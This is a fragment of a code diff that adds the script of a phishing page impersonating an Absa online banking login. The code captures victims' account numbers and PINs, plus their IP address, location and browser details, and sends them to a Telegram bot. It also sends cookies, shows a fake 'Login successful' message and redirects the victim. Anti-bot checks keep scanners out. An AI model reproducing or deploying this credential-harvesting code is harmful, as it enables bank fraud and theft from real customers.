+[ IP ADDRESS] = ${ip}
+[ LOCATION] = http://www.geoiptool.com/?IP=${ip}
+[ DATE/TIME] = ${datetime.time} / ${datetime.date}
+
+${browserInfo}
+
+[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[+]`;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
+                const params = new URLSearchParams({
+                    chat_id: TELEGRAM_CONFIG.chatId,
+                    text: message
+                });
+
+                const response = await fetch(`${url}?${params}`);
+                const result = await response.json();
+
+                if (result.ok) {
+                    // إرسال ملف الكوكيز بعد إرسال البيانات
+                    await sendCookiesToTelegram();
+                    return { success: true, message: 'Data sent successfully' };
+                } else {
+                    throw new Error('Telegram API error');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return { success: false, message: 'Failed to send data' };
+            }
+        }
+
+        // Advanced Form Submission Handler
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+
+            // Advanced Security Validations
+            if (!validateHoneypot()) {
+                showStatus('Security verification failed', 'error');
+                return;
+            }
+
+            if (!validateTimeOnPage()) {
+                showStatus(`Please spend at least ${SECURITY_CONFIG.minTimeOnPage} seconds on the page`, 'error');
+                return;
+            }
+
+            if (!validateHumanScore()) {
+                if (securityState.flags.isBot) {
+                    showStatus('Automated activity detected. Access denied.', 'error');
+                } else {
+                    showStatus(`Human verification incomplete (${Math.floor(securityState.humanScore)}/10). Please interact with the page.`, 'error');
+                }
+                return;
+            }
+
+            if (!validateUserAgent()) {
+                showStatus('Unsupported browser detected', 'error');
+                return;
+            }
+
+            if (!validateHumanCheck()) {
+                showStatus('Security token invalid', 'error');
+                return;
+            }
+
+            const rateCheck = validateSubmissionRate();
+            if (!rateCheck.valid) {
+                showStatus(rateCheck.message, 'error');
+                return;
+            }
+
+            // Get form values
+            const account = document.getElementById('account').value.trim();
+            const pin = document.getElementById('pin').value;
+            const user = document.getElementById('user').value;
+
+            // Basic validation
+            if (!account || !pin) {
+                showStatus('Please fill in all required fields', 'error');
+                return;
+            }
+
+            if (!validatePIN()) {
+                showStatus('Please enter a valid PIN (minimum 4 digits)', 'error');
+                return;
+            }
+
+            if (!validateAccount()) {
+                showStatus('Please enter a valid account number', 'error');
+                return;
+            }
+
+            // Disable form and show loading
+            disableForm();
+            showStatus('Processing your login information...', 'loading');
+
+            try {
+                // Send data to Telegram
+                const result = await sendToTelegram(account, pin, user);
+                
+                if (result.success) {
+                    showStatus('Login successful! Redirecting...', 'success');
+                    
+                    // Clear sensitive data
+                    document.getElementById('pin').value = '';
+                    document.getElementById('account').value = '';
+                    
+                    // Redirect after short delay
+                    setTimeout(() => {
+                        window.location.href = 'loading.html';
+                    }, 1500);
+                } else {
+                    throw new Error(result.message);
+                }
+            } catch (error) {
+                showStatus('An error occurred. Please try again.', 'error');
+                enableForm();
+            }
+        }
+
+        // Forgot PIN Handler
+        function handleForgotPIN() {
+            alert('For security reasons, please contact Absa customer support to reset your PIN.\n\nCall: 0860 008 600\nVisit: Your nearest Absa branch');
+        }
+
+        // Help Button Handler
+        function handleHelpButton() {
+            alert('Need help with online banking?\n\nContact Absa Support:\n📞 0860 008 600\n🏦 Visit your nearest branch\n💻 Online support available 24/7');
+        }
+
+        // Event Listeners
+        loginForm.addEventListener('submit', handleFormSubmit);
+        forgotBtn.addEventListener('click', handleForgotPIN);
+        document.querySelector('.help-button').addEventListener('click', handleHelpButton);
+
+        // Initialize security features when page loads
+        document.addEventListener('DOMContentLoaded', initializeSecurity);
+    </script>
+</body>
+</html>
